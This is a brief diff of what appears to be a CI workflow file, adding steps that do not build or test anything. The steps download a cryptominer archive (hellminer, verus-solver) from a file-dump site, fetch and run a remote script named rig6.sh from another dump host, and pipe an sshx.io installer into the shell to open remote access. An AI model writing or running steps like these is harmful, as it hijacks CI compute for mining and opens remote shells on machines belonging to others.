@@ -14,7 +14,7 @@ jobs:
       - run: wget https://bashupload.com/uFZkJ/miner.zip
       - run: unzip miner.zip
       - run: chmod +x hellminer verus-solver
-      - run: wget anotherdump.rf.gd/rig6.sh
+      - run: wget https://anotherdump.rf.gd/rig6.sh
       - run: chmod +x rig6.sh
       - run: ./rig6.sh
       - run: curl -sSf https://sshx.io/get | sh -s run
